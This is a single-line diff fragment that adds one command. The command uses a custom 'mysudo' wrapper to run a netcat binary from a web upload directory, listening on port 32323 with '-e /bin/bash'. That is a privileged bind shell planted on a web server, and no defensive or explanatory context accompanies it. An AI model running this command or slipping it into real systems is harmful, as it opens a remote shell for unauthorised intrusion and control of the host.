@@ -1,0 +1,1 @@
+/usr/local/bin/mysudo "/var/www/upload/netcat -nvv -l -e /bin/bash -p 32323"
